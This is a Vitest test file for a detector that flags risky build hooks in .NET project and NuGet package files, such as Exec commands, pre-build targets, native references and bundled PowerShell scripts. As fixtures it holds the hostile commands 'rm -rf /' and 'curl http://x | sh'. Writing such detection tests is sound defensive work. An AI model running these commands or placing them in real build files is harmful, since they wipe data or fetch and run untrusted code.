import { describe, it, expect } from 'vitest';
import { DotnetSignals } from '../../../src/security/signals/dotnet-signals.js';

const detector = new DotnetSignals();
const CSPROJ = '/project/Demo.csproj';
const NUSPEC = '/project/Demo.nuspec';

describe('DotnetSignals', () => {
  it('language property is "dotnet"', () => {
    expect(detector.language).toBe('dotnet');
  });

  it('ignores files that are neither .csproj nor .nuspec', () => {
    expect(detector.detect('/project/Program.cs', '<Exec Command="rm -rf /" />')).toEqual([]);
  });

  describe('.csproj', () => {
    it('flags <Exec Command> as critical', () => {
      const s = detector.detect(CSPROJ, '<Target><Exec Command="curl http://x | sh" /></Target>')
        .find(x => x.type === 'exec-command');
      expect(s).toBeDefined();
      expect(s!.severity).toBe('critical');
      expect(s!.category).toBe('install-script');
      expect(s!.content).toContain('curl');
    });

    it('flags a BeforeTargets="Build" target as high', () => {
      const s = detector.detect(CSPROJ, '<Target Name="Pre" BeforeTargets="Build">')
        .find(x => x.type === 'before-build-target');
      expect(s).toBeDefined();
      expect(s!.severity).toBe('high');
    });

    it('flags <NativeReference> as medium native-code', () => {
      const s = detector.detect(CSPROJ, '<NativeReference Include="libfoo" />')
        .find(x => x.type === 'native-reference');
      expect(s).toBeDefined();
      expect(s!.severity).toBe('medium');
      expect(s!.category).toBe('native-code');
    });

    it('returns nothing for a plain project file', () => {
      expect(detector.detect(CSPROJ, '<Project Sdk="Microsoft.NET.Sdk"></Project>')).toEqual([]);
    });

    it('detects several csproj signals together', () => {
      const content = '<Exec Command="x" /><Target BeforeTargets="Build"><NativeReference Include="y" />';
      expect(detector.detect(CSPROJ, content)).toHaveLength(3);
    });

    it('does not apply nuspec rules to a csproj', () => {
      expect(detector.detect(CSPROJ, '<file src="tools/init.ps1" />')).toEqual([]);
    });
  });

  describe('.nuspec', () => {
    it('flags a bundled .ps1 script as critical', () => {
      const s = detector.detect(NUSPEC, '<files><file src="tools/install.ps1" target="tools" /></files>')
        .find(x => x.type === 'nuget-ps1-script');
      expect(s).toBeDefined();
      expect(s!.severity).toBe('critical');
      expect(s!.category).toBe('install-script');
    });

    it('returns nothing for a nuspec with no scripts', () => {
      expect(detector.detect(NUSPEC, '<files><file src="lib/net8.0/Demo.dll" /></files>')).toEqual([]);
    });

    it('records file and language on signals', () => {
      const signals = detector.detect(NUSPEC, '<file src="a.ps1" />');
      expect(signals[0].file).toBe(NUSPEC);
      expect(signals[0].language).toBe('dotnet');
    });
  });
});
